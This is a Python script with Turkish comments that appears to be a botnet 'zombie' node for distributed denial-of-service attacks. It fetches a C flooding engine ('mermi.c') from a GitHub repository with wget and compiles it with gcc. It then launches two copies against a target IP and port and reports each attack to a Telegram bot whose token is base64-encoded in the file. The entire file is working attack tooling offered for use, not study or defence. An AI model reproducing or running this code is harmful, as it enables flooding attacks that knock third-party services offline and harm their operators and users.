#!/usr/bin/env python3
import os
import sys
import base64
import requests
import subprocess

# --- GÜVENLİK ---
# Token ve ID gizlendi
D_KEY = "ODgxODc0NzI4MjpBQUVIRERwNlU4WnhFNFlpMGwxT2VvOU5kLWhNdTdYdVBMbw=="
MY_ID = "6614488737"
ZOMBI_AD = f"Zombi-{os.uname()[1]}"

def s_msg(text):
    try:
        t_kn = base64.b64decode(D_KEY).decode("utf-8")
        url = f"https://api.telegram.org/bot{t_kn}/sendMessage"
        requests.post(url, data={"chat_id": MY_ID, "text": text}, timeout=5)
    except:
        pass

def motor_hazirla():
    print("🧹 Temizlik ve C-Engine hazırlığı...")
    os.system("rm -f mermi mermi.c")
    os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/mermi.c")
    derleme = os.system("gcc -O3 mermi.c -o mermi -lpthread")
    if derleme == 0:
        os.system("chmod +x mermi")
        return True
    return False

def ates_et(method, target, port, threads, duration):
    if not os.path.exists("./mermi"):
        if not motor_hazirla(): return

    print(f"\n🔥 MANUEL VURUŞ TETİKLENDİ!")
    print(f"🚀 Metot: {method} | Hedef: {target}:{port}")
    print(f"⚡ Kol: {threads} | Süre: {duration}s")

    # Mermi.c'nin beklediği sıralama: method target port threads duration
    attack_cmd = ["./mermi", str(method), str(target), str(port), str(threads), str(duration)]
    
    # Maksimum hat verimi için 2 koldan C-Engine ateşle
    for _ in range(2):
        subprocess.Popen(attack_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    s_msg(f"🏴‍☠️ {ZOMBI_AD} Ateş Başlattı!\n🎯 {target}\n🛠 {method} | {threads} Thread")

if __name__ == "__main__":
    # SIRALAMA: method target ip port threads time
    if len(sys.argv) < 6:
        print("\n❌ SIRALAMA HATASI!")
        print("Kullanım: python3 slave.py <METHOD> <IP> <PORT> <THREADS> <TIME>")
        print("Örnek: python3 slave.py udpb3 1.1.1.1 80 3 300")
    else:
        metot = sys.argv[1]
        ip = sys.argv[2]
        port = sys.argv[3]
        thr = sys.argv[4]
        sure = sys.argv[5]
        
        ates_et(metot, ip, port, thr, sure)
